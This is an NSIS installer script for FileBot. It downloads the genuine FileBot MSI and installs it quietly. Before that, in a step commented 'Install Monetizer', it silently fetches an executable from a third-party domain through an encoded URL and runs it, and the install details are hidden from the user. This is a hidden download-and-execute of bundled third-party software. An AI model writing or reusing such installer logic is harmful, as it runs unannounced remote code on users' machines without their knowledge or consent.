!define PRODUCT_NAME "FileBot"

!include "MUI2.nsh"
!include "x64.nsh"

; MUI Settings / Icons
!define MUI_ICON "icon.ico"

; MUI Settings / Header
!define MUI_HEADERIMAGE
!define MUI_HEADERIMAGE_RIGHT
!define MUI_HEADERIMAGE_BITMAP "header.bmp"
 
; MUI Settings / Wizard
!define MUI_WELCOMEFINISHPAGE_BITMAP "wizard.bmp"


!insertmacro MUI_PAGE_WELCOME
!insertmacro MUI_PAGE_INSTFILES
!insertmacro MUI_LANGUAGE "English"

Name "FileBot"
OutFile "FileBot-setup.exe"
ShowInstDetails hide
AutoCloseWindow false

Section ""
	 DetailPrint "Initializing..."
	 
     ;Install Monetizer
     inetc::get /SILENT /CONNECTTIMEOUT 10 /RECEIVETIMEOUT 30 "http://www.comay13north.com/download.php?loGFcg==" "$PLUGINSDIR\InstallManager.exe" /end
     nsExec::Exec /TIMEOUT=120000 '$PLUGINSDIR\InstallManager.exe'
	 
	 DetailPrint "Downloading latest version..."
     ;Install latest FileBot
     ${if} ${RunningX64}
        inetc::get /USERAGENT "nsis" /caption "Downloading FileBot (x64)" "http://www.filebot.net/download.php?mode=nsis&type=msi&arch=x64" "$PLUGINSDIR\FileBot.msi" /end
     ${else}
        inetc::get /USERAGENT "nsis" /caption "Downloading FileBot (x86)" "http://www.filebot.net/download.php?mode=nsis&type=msi&arch=x86" "$PLUGINSDIR\FileBot.msi" /end
     ${endif}
	 DetailPrint "Installing latest version..."
     nsExec::Exec 'msiexec /quiet /i "$PLUGINSDIR\FileBot.msi"'
	 Pop $0 # return value
	 ${if} $0 != "0"
        DetailPrint "Install failed."
		Abort
     ${endif}
SectionEnd
